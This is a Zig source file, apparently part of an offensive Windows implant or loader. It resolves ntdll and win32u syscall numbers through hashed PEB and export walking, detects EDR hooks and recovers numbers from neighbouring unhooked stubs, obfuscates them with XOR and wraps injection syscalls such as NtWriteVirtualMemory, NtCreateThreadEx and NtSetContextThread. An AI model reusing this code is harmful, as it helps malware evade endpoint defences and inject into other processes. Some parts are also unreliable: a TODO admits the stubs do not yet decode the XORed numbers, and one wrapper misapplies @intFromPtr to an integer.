const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");
const config = @import("config");

comptime {
    _ = @import("stubs.zig");
    _ = @import("stack_spoof.zig");
}

pub export var ssn_NtAllocateVirtualMemory: u32 = 0;
pub export var ssn_NtProtectVirtualMemory: u32 = 0;
pub export var ssn_NtFreeVirtualMemory: u32 = 0;
pub export var ssn_NtWriteVirtualMemory: u32 = 0;
pub export var ssn_NtClose: u32 = 0;
pub export var ssn_NtOpenFile: u32 = 0;
pub export var ssn_NtReadVirtualMemory: u32 = 0;
pub export var ssn_NtCreateSection: u32 = 0;
pub export var ssn_NtMapViewOfSection: u32 = 0;
pub export var ssn_NtQueryInformationProcess: u32 = 0;
pub export var ssn_NtCreateFile: u32 = 0;
pub export var ssn_NtWriteFile: u32 = 0;
pub export var ssn_NtQuerySystemInformation: u32 = 0;
pub export var ssn_NtDelayExecution: u32 = 0;
pub export var ssn_NtCreateEvent: u32 = 0;
pub export var ssn_NtWaitForSingleObject: u32 = 0;
pub export var ssn_NtOpenKey: u32 = 0;
pub export var ssn_NtQueryValueKey: u32 = 0;
pub export var ssn_NtSetInformationProcess: u32 = 0;
pub export var ssn_NtSetInformationFile: u32 = 0;
pub export var ssn_NtUserGetSystemMetrics: u32 = 0;
pub export var ssn_NtGetContextThread: u32 = 0;
pub export var ssn_NtSetContextThread: u32 = 0;
pub export var ssn_NtOpenSection: u32 = 0;
pub export var ssn_NtUnmapViewOfSection: u32 = 0;
pub export var ssn_NtCreateThreadEx: u32 = 0;
pub export var ssn_NtOpenProcess: u32 = 0;
pub export var ssn_NtResumeThread: u32 = 0;
pub export var ssn_NtSuspendThread: u32 = 0;
pub export var ssn_NtDeleteFile: u32 = 0;
pub export var ssn_NtFlushInstructionCache: u32 = 0;

// ── Extern stubs (defined in stubs.zig via comptime global asm) ──
extern fn NtAllocateVirtualMemory_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64) callconv(.c) u64;
extern fn NtProtectVirtualMemory_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64) callconv(.c) u64;
extern fn NtFreeVirtualMemory_stub(a1: u64, a2: u64, a3: u64, a4: u64) callconv(.c) u64;
extern fn NtWriteVirtualMemory_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64) callconv(.c) u64;
extern fn NtClose_stub(a1: u64) callconv(.c) u64;
extern fn NtOpenFile_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64) callconv(.c) u64;
extern fn NtReadVirtualMemory_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64) callconv(.c) u64;
extern fn NtCreateSection_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64) callconv(.c) u64;
extern fn NtMapViewOfSection_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64, a8: u64, a9: u64, a10: u64) callconv(.c) u64;
extern fn NtQueryInformationProcess_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64) callconv(.c) u64;
extern fn NtCreateFile_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64, a8: u64, a9: u64, a10: u64, a11: u64) callconv(.c) u64;
extern fn NtWriteFile_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64, a8: u64, a9: u64) callconv(.c) u64;
extern fn NtQuerySystemInformation_stub(a1: u64, a2: u64, a3: u64, a4: u64) callconv(.c) u64;
extern fn NtDelayExecution_stub(a1: u64, a2: u64) callconv(.c) u64;
extern fn NtCreateEvent_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64) callconv(.c) u64;
extern fn NtWaitForSingleObject_stub(a1: u64, a2: u64, a3: u64) callconv(.c) u64;
extern fn NtOpenKey_stub(a1: u64, a2: u64, a3: u64) callconv(.c) u64;
extern fn NtQueryValueKey_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64) callconv(.c) u64;
extern fn NtSetInformationProcess_stub(a1: u64, a2: u64, a3: u64, a4: u64) callconv(.c) u64;
extern fn NtSetInformationFile_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64) callconv(.c) u64;
extern fn NtUserGetSystemMetrics_stub(a1: u64) callconv(.c) u64;
extern fn NtGetContextThread_stub(a1: u64, a2: u64) callconv(.c) u64;
extern fn NtSetContextThread_stub(a1: u64, a2: u64) callconv(.c) u64;
extern fn NtOpenSection_stub(a1: u64, a2: u64, a3: u64) callconv(.c) u64;
extern fn NtUnmapViewOfSection_stub(a1: u64, a2: u64) callconv(.c) u64;
extern fn NtCreateThreadEx_stub(a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64, a8: u64, a9: u64, a10: u64, a11: u64) callconv(.c) u64;
extern fn NtOpenProcess_stub(a1: u64, a2: u64, a3: u64, a4: u64) callconv(.c) u64;
extern fn NtResumeThread_stub(a1: u64, a2: u64) callconv(.c) u64;
extern fn NtSuspendThread_stub(a1: u64, a2: u64) callconv(.c) u64;
extern fn NtDeleteFile_stub(a1: u64) callconv(.c) u64;
extern fn NtFlushInstructionCache_stub(a1: u64, a2: u64, a3: u64) callconv(.c) u64;

const ntdll_dll_hash: u32 = hash.encryptedHashModule("ntdll.dll");
const win32u_dll_hash: u32 = hash.encryptedHashModule("win32u.dll");

inline fn readU32le(ptr: [*]const u8) u32 {
    return @as(u32, ptr[0]) | (@as(u32, ptr[1]) << 8) | (@as(u32, ptr[2]) << 16) | (@as(u32, ptr[3]) << 24);
}

fn isHooked(stub: [*]const u8) bool {
    if (stub[0] == 0xE9) return true;
    if (stub[0] == 0xFF and stub[1] == 0x25) return true;
    if (stub[0] == 0xCC) return true;
    if (stub[0] == 0x48 and stub[1] == 0xB8) return true;
    return false;
}

fn extractSsn(stub: [*]const u8) ?u32 {
    if (stub[0] == 0x4C and stub[1] == 0x8B and stub[2] == 0xD1 and stub[3] == 0xB8) {
        return readU32le(stub + 4);
    }
    var i: usize = 0;
    while (i < 12) : (i += 1) {
        if (stub[i] == 0xB8 and (i + 4) <= 0x20) {
            const candidate = readU32le(stub + i + 1);
            if (candidate < 0x500) return candidate;
        }
    }
    return null;
}

const TextBounds = struct { start: usize, end: usize };

fn getTextSectionBounds(base: types.PVOID) ?TextBounds {
    const bp: [*]u8 = @ptrCast(@alignCast(base));
    const dos: *types.IMAGE_DOS_HEADER = @ptrCast(@alignCast(bp));
    if (dos.e_magic != types.IMAGE_DOS_SIGNATURE) return null;
    const nt_off: usize = @intCast(dos.e_lfanew);
    const nt: *types.IMAGE_NT_HEADERS64 = @ptrCast(@alignCast(bp + nt_off));
    if (nt.Signature != types.IMAGE_NT_SIGNATURE) return null;
    const oh_off = nt_off + @offsetOf(types.IMAGE_NT_HEADERS64, "OptionalHeader");
    const sec_off = oh_off + nt.FileHeader.SizeOfOptionalHeader;
    const secs: [*]types.IMAGE_SECTION_HEADER = @ptrCast(@alignCast(bp + sec_off));
    for (0..nt.FileHeader.NumberOfSections) |i| {
        const s = secs[i];
        if (s.Name[0] == '.' and s.Name[1] == 't' and s.Name[2] == 'e' and s.Name[3] == 'x' and s.Name[4] == 't') {
            return TextBounds{ .start = @intFromPtr(bp) + s.VirtualAddress, .end = @intFromPtr(bp) + s.VirtualAddress + s.Misc.VirtualSize };
        }
    }
    return null;
}

fn resolveSsn(ntdll_base: types.PVOID, func_hash: u32) ?u32 {
    const func_ptr = export_resolve.getFunctionByHash(ntdll_base, func_hash) orelse return null;
    const stub: [*]const u8 = @ptrCast(@alignCast(func_ptr));
    if (!isHooked(stub)) return extractSsn(stub);
    const bounds = getTextSectionBounds(ntdll_base) orelse return null;
    const stub_addr: usize = @intFromPtr(stub);
    const strides = [_]usize{ 0x20, 0x28, 0x30 };
    var dist: usize = 1;
    while (dist <= 8) : (dist += 1) {
        for (&strides) |stride| {
            const off = dist * stride;
            const fwd = stub_addr + off;
            if (fwd + 0x20 <= bounds.end) {
                const fs: [*]const u8 = @ptrFromInt(fwd);
                if (!isHooked(fs)) {
                    if (extractSsn(fs)) |ns| return ns - @as(u32, @intCast(dist));
                }
            }
            if (off <= stub_addr - bounds.start) {
                const bwd = stub_addr - off;
                if (bwd >= bounds.start and bwd + 0x20 <= bounds.end) {
                    const bs: [*]const u8 = @ptrFromInt(bwd);
                    if (!isHooked(bs)) {
                        if (extractSsn(bs)) |ns| return ns + @as(u32, @intCast(dist));
                    }
                }
            }
        }
    }
    return null;
}

fn resolveAndAssign(ntdll_base: types.PVOID, comptime name_hash: u32, ssn_ptr: *u32) bool {
    if (resolveSsn(ntdll_base, name_hash)) |ssn| {
        // SSNs stored XOR-obfuscated — at-rest encrypted in the globals.
        // TODO: update the 29 asm stubs in stubs.zig to deobfuscate (eax ^ SSN_XOR_KEY)
        // before the syscall instruction, so the key is never in the clear.
        ssn_ptr.* = ssn ^ config.SSN_XOR_KEY;
        return true;
    }
    return false;
}

pub fn resolve() bool {
    const ntdll = peb_walk.getModuleByHash(ntdll_dll_hash) orelse return false;
    _ = export_resolve.initNativeResolver(ntdll);
    var ok = true;
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtAllocateVirtualMemory"), &ssn_NtAllocateVirtualMemory);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtProtectVirtualMemory"), &ssn_NtProtectVirtualMemory);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtFreeVirtualMemory"), &ssn_NtFreeVirtualMemory);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtWriteVirtualMemory"), &ssn_NtWriteVirtualMemory);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtClose"), &ssn_NtClose);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtOpenFile"), &ssn_NtOpenFile);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtReadVirtualMemory"), &ssn_NtReadVirtualMemory);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtCreateSection"), &ssn_NtCreateSection);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtMapViewOfSection"), &ssn_NtMapViewOfSection);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtQueryInformationProcess"), &ssn_NtQueryInformationProcess);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtCreateFile"), &ssn_NtCreateFile);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtWriteFile"), &ssn_NtWriteFile);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtQuerySystemInformation"), &ssn_NtQuerySystemInformation);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtDelayExecution"), &ssn_NtDelayExecution);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtCreateEvent"), &ssn_NtCreateEvent);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtWaitForSingleObject"), &ssn_NtWaitForSingleObject);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtOpenKey"), &ssn_NtOpenKey);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtQueryValueKey"), &ssn_NtQueryValueKey);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtSetInformationProcess"), &ssn_NtSetInformationProcess);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtSetInformationFile"), &ssn_NtSetInformationFile);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtGetContextThread"), &ssn_NtGetContextThread);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtSetContextThread"), &ssn_NtSetContextThread);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtOpenSection"), &ssn_NtOpenSection);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtUnmapViewOfSection"), &ssn_NtUnmapViewOfSection);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtCreateThreadEx"), &ssn_NtCreateThreadEx);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtOpenProcess"), &ssn_NtOpenProcess);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtResumeThread"), &ssn_NtResumeThread);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtSuspendThread"), &ssn_NtSuspendThread);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtDeleteFile"), &ssn_NtDeleteFile);
    ok = ok and resolveAndAssign(ntdll, hash.encryptedHashFunc("NtFlushInstructionCache"), &ssn_NtFlushInstructionCache);
    return ok;
}

pub fn resolveWin32u() bool {
    const win32u = peb_walk.getModuleByHash(win32u_dll_hash) orelse return false;
    return resolveAndAssign(win32u, hash.encryptedHashFunc("NtUserGetSystemMetrics"), &ssn_NtUserGetSystemMetrics);
}

// ── Zig wrappers → extern stubs ──

pub fn NtAllocateVirtualMemory(
    ProcessHandle: types.HANDLE,
    BaseAddress: *types.PVOID,
    ZeroBits: types.ULONG,
    RegionSize: *types.SIZE_T,
    AllocationType: types.ULONG,
    Protect: types.ULONG,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtAllocateVirtualMemory_stub(
        @intFromPtr(ProcessHandle),
        @intFromPtr(BaseAddress),
        ZeroBits,
        @intFromPtr(RegionSize),
        AllocationType,
        Protect,
    )));
}

pub fn NtProtectVirtualMemory(
    ProcessHandle: types.HANDLE,
    BaseAddress: *types.PVOID,
    NumberOfBytesToProtect: *types.SIZE_T,
    NewAccessProtection: types.ULONG,
    OldAccessProtection: *types.ULONG,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtProtectVirtualMemory_stub(
        @intFromPtr(ProcessHandle),
        @intFromPtr(BaseAddress),
        @intFromPtr(NumberOfBytesToProtect),
        NewAccessProtection,
        @intFromPtr(OldAccessProtection),
    )));
}

pub fn NtFreeVirtualMemory(
    ProcessHandle: types.HANDLE,
    BaseAddress: *types.PVOID,
    RegionSize: *types.SIZE_T,
    FreeType: types.ULONG,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtFreeVirtualMemory_stub(
        @intFromPtr(ProcessHandle),
        @intFromPtr(BaseAddress),
        @intFromPtr(RegionSize),
        FreeType,
    )));
}

pub fn NtWriteVirtualMemory(
    ProcessHandle: types.HANDLE,
    BaseAddress: types.PVOID,
    Buffer: types.PVOID,
    NumberOfBytesToWrite: types.SIZE_T,
    NumberOfBytesWritten: *types.SIZE_T,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtWriteVirtualMemory_stub(
        @intFromPtr(ProcessHandle),
        @intFromPtr(BaseAddress),
        @intFromPtr(Buffer),
        NumberOfBytesToWrite,
        @intFromPtr(NumberOfBytesWritten),
    )));
}

pub fn NtClose(Handle: types.HANDLE) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtClose_stub(@intFromPtr(Handle))));
}

pub fn NtOpenFile(
    FileHandle: *types.HANDLE,
    DesiredAccess: types.ULONG,
    ObjectAttributes: types.PVOID,
    IoStatusBlock: types.PVOID,
    ShareAccess: types.ULONG,
    OpenOptions: types.ULONG,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtOpenFile_stub(
        @intFromPtr(FileHandle),
        DesiredAccess,
        @intFromPtr(ObjectAttributes),
        @intFromPtr(IoStatusBlock),
        ShareAccess,
        OpenOptions,
    )));
}

pub fn NtReadVirtualMemory(
    ProcessHandle: types.HANDLE,
    BaseAddress: types.PVOID,
    Buffer: types.PVOID,
    NumberOfBytesToRead: types.SIZE_T,
    NumberOfBytesRead: *types.SIZE_T,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtReadVirtualMemory_stub(
        @intFromPtr(ProcessHandle),
        @intFromPtr(BaseAddress),
        @intFromPtr(Buffer),
        NumberOfBytesToRead,
        @intFromPtr(NumberOfBytesRead),
    )));
}

pub fn NtCreateSection(
    SectionHandle: *types.HANDLE,
    DesiredAccess: types.ULONG,
    ObjectAttributes: types.PVOID,
    MaximumSize: types.PVOID,
    SectionPageProtection: types.ULONG,
    AllocationAttributes: types.ULONG,
    FileHandle: types.HANDLE,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtCreateSection_stub(
        @intFromPtr(SectionHandle),
        DesiredAccess,
        @intFromPtr(ObjectAttributes),
        @intFromPtr(MaximumSize),
        SectionPageProtection,
        AllocationAttributes,
        @intFromPtr(FileHandle),
    )));
}

pub fn NtMapViewOfSection(
    SectionHandle: types.HANDLE,
    ProcessHandle: types.HANDLE,
    BaseAddress: *types.PVOID,
    ZeroBits: types.ULONG,
    CommitSize: types.SIZE_T,
    SectionOffset: types.PVOID,
    ViewSize: *types.SIZE_T,
    InheritDisposition: types.ULONG,
    _: types.ULONG,
    _: types.ULONG,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtMapViewOfSection_stub(
        @intFromPtr(SectionHandle),
        @intFromPtr(ProcessHandle),
        @intFromPtr(BaseAddress),
        ZeroBits,
        CommitSize,
        @intFromPtr(SectionOffset),
        @intFromPtr(ViewSize),
        InheritDisposition,
        0,
        0,
    )));
}

pub fn NtWriteFile(
    FileHandle: types.HANDLE,
    Event: types.HANDLE,
    ApcRoutine: ?*const anyopaque,
    ApcContext: ?*const anyopaque,
    IoStatusBlock: types.PVOID,
    Buffer: types.PVOID,
    Length: types.ULONG,
    ByteOffset: ?*const anyopaque,
    Key: ?*const anyopaque,
) types.NTSTATUS {
    const apc_routine = if (ApcRoutine) |p| @intFromPtr(p) else 0;
    const apc_context = if (ApcContext) |p| @intFromPtr(p) else 0;
    const byte_off = if (ByteOffset) |p| @intFromPtr(p) else 0;
    const key = if (Key) |p| @intFromPtr(p) else 0;
    return @as(types.NTSTATUS, @intCast(NtWriteFile_stub(
        @intFromPtr(FileHandle),
        @intFromPtr(Event),
        apc_routine,
        apc_context,
        @intFromPtr(IoStatusBlock),
        @intFromPtr(Buffer),
        Length,
        byte_off,
        key,
    )));
}

pub fn NtCreateFile(
    FileHandle: *types.HANDLE,
    DesiredAccess: types.ULONG,
    ObjectAttributes: types.PVOID,
    IoStatusBlock: types.PVOID,
    AllocationSize: ?*const anyopaque,
    FileAttributes: types.ULONG,
    ShareAccess: types.ULONG,
    CreateDisposition: types.ULONG,
    CreateOptions: types.ULONG,
    EaBuffer: ?*const anyopaque,
    EaLength: types.ULONG,
) types.NTSTATUS {
    const alloc_size = if (AllocationSize) |p| @intFromPtr(p) else 0;
    const ea_buf = if (EaBuffer) |p| @intFromPtr(p) else 0;
    return @as(types.NTSTATUS, @intCast(NtCreateFile_stub(
        @intFromPtr(FileHandle),
        DesiredAccess,
        @intFromPtr(ObjectAttributes),
        @intFromPtr(IoStatusBlock),
        alloc_size,
        FileAttributes,
        ShareAccess,
        CreateDisposition,
        CreateOptions,
        ea_buf,
        EaLength,
    )));
}

pub fn NtQueryInformationProcess(
    ProcessHandle: types.HANDLE,
    ProcessInformationClass: types.ULONG,
    ProcessInformation: types.PVOID,
    ProcessInformationLength: types.ULONG,
    ReturnLength: *types.ULONG,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtQueryInformationProcess_stub(
        @intFromPtr(ProcessHandle),
        ProcessInformationClass,
        @intFromPtr(ProcessInformation),
        ProcessInformationLength,
        @intFromPtr(ReturnLength),
    )));
}

pub fn NtUserGetSystemMetrics(nIndex: types.ULONG) types.LONG {
    const r = NtUserGetSystemMetrics_stub(nIndex);
    return @as(types.LONG, @bitCast(@as(u32, @truncate(r))));
}

pub fn NtQuerySystemInformation(
    SystemInformationClass: types.ULONG,
    SystemInformation: types.PVOID,
    SystemInformationLength: types.ULONG,
    ReturnLength: *types.ULONG,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtQuerySystemInformation_stub(
        SystemInformationClass,
        @intFromPtr(SystemInformation),
        SystemInformationLength,
        @intFromPtr(ReturnLength),
    )));
}

pub fn NtDelayExecution(
    Alertable: types.BOOLEAN,
    DelayInterval: *types.LARGE_INTEGER,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtDelayExecution_stub(
        Alertable,
        @intFromPtr(DelayInterval),
    )));
}

pub fn NtCreateEvent(
    EventHandle: *types.HANDLE,
    DesiredAccess: types.ULONG,
    ObjectAttributes: types.PVOID,
    EventType: types.ULONG,
    InitialState: types.BOOLEAN,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtCreateEvent_stub(
        @intFromPtr(EventHandle),
        DesiredAccess,
        @intFromPtr(ObjectAttributes),
        EventType,
        InitialState,
    )));
}

pub fn NtWaitForSingleObject(
    Handle: types.HANDLE,
    Alertable: types.BOOLEAN,
    Timeout: ?*const types.LARGE_INTEGER,
) types.NTSTATUS {
    const to = if (Timeout) |p| @intFromPtr(p) else 0;
    return @as(types.NTSTATUS, @intCast(NtWaitForSingleObject_stub(
        @intFromPtr(Handle),
        Alertable,
        to,
    )));
}

pub fn NtOpenKey(
    KeyHandle: *types.HANDLE,
    DesiredAccess: types.ULONG,
    ObjectAttributes: types.PVOID,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtOpenKey_stub(
        @intFromPtr(KeyHandle),
        DesiredAccess,
        @intFromPtr(ObjectAttributes),
    )));
}

pub fn NtQueryValueKey(
    KeyHandle: types.HANDLE,
    ValueName: *types.UNICODE_STRING,
    KeyValueInformationClass: types.ULONG,
    KeyValueInformation: types.PVOID,
    Length: types.ULONG,
    ResultLength: *types.ULONG,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtQueryValueKey_stub(
        @intFromPtr(KeyHandle),
        @intFromPtr(ValueName),
        KeyValueInformationClass,
        @intFromPtr(KeyValueInformation),
        Length,
        @intFromPtr(ResultLength),
    )));
}

pub fn NtSetInformationProcess(
    ProcessHandle: types.HANDLE,
    ProcessInformationClass: types.ULONG,
    ProcessInformation: types.PVOID,
    ProcessInformationLength: types.ULONG,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtSetInformationProcess_stub(
        @intFromPtr(ProcessHandle),
        ProcessInformationClass,
        @intFromPtr(ProcessInformation),
        ProcessInformationLength,
    )));
}

pub fn NtGetContextThread(
    ThreadHandle: types.HANDLE,
    Context: types.PVOID,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtGetContextThread_stub(
        @intFromPtr(ThreadHandle),
        @intFromPtr(Context),
    )));
}

pub fn NtSetContextThread(
    ThreadHandle: types.HANDLE,
    Context: types.PVOID,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtSetContextThread_stub(
        @intFromPtr(ThreadHandle),
        @intFromPtr(Context),
    )));
}

pub fn NtOpenSection(
    SectionHandle: *types.HANDLE,
    DesiredAccess: types.ULONG,
    ObjectAttributes: types.PVOID,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtOpenSection_stub(
        @intFromPtr(SectionHandle),
        DesiredAccess,
        @intFromPtr(ObjectAttributes),
    )));
}

pub fn NtUnmapViewOfSection(
    ProcessHandle: types.HANDLE,
    BaseAddress: types.PVOID,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtUnmapViewOfSection_stub(
        @intFromPtr(ProcessHandle),
        @intFromPtr(BaseAddress),
    )));
}

pub fn NtCreateThreadEx(
    ThreadHandle: *types.HANDLE,
    DesiredAccess: types.ULONG,
    ObjectAttributes: types.PVOID,
    ProcessHandle: types.HANDLE,
    StartRoutine: types.PVOID,
    Argument: types.PVOID,
    CreateFlags: types.ULONG,
    ZeroBits: types.SIZE_T,
    StackSize: types.SIZE_T,
    MaximumStackSize: types.SIZE_T,
    AttributeList: types.PVOID,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtCreateThreadEx_stub(
        @intFromPtr(ThreadHandle),
        DesiredAccess,
        @intFromPtr(ObjectAttributes),
        @intFromPtr(ProcessHandle),
        @intFromPtr(StartRoutine),
        @intFromPtr(Argument),
        CreateFlags,
        ZeroBits,
        StackSize,
        MaximumStackSize,
        @intFromPtr(AttributeList),
    )));
}

pub fn NtOpenProcess(
    ProcessHandle: *types.HANDLE,
    DesiredAccess: types.ULONG,
    ObjectAttributes: types.PVOID,
    ClientId: types.PVOID,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtOpenProcess_stub(
        @intFromPtr(ProcessHandle),
        DesiredAccess,
        @intFromPtr(ObjectAttributes),
        @intFromPtr(ClientId),
    )));
}

pub fn NtResumeThread(
    ThreadHandle: types.HANDLE,
    SuspendCount: *types.ULONG,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtResumeThread_stub(
        @intFromPtr(ThreadHandle),
        @intFromPtr(SuspendCount),
    )));
}

pub fn NtSuspendThread(
    ThreadHandle: types.HANDLE,
    PreviousSuspendCount: *types.ULONG,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtSuspendThread_stub(
        @intFromPtr(ThreadHandle),
        @intFromPtr(PreviousSuspendCount),
    )));
}

pub fn NtDeleteFile(
    ObjectAttributes: types.PVOID,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtDeleteFile_stub(
        @intFromPtr(ObjectAttributes),
    )));
}

pub fn NtSetInformationFile(
    FileHandle: types.HANDLE,
    IoStatusBlock: types.PVOID,
    FileInformation: types.PVOID,
    Length: types.ULONG,
    FileInformationClass: types.ULONG,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtSetInformationFile_stub(
        @intFromPtr(FileHandle),
        @intFromPtr(IoStatusBlock),
        @intFromPtr(FileInformation),
        Length,
        @intFromPtr(FileInformationClass),
    )));
}

pub fn NtFlushInstructionCache(
    ProcessHandle: types.HANDLE,
    BaseAddress: types.PVOID,
    NumberOfBytesToFlush: types.SIZE_T,
) types.NTSTATUS {
    return @as(types.NTSTATUS, @intCast(NtFlushInstructionCache_stub(
        @intFromPtr(ProcessHandle),
        @intFromPtr(BaseAddress),
        NumberOfBytesToFlush,
    )));
}
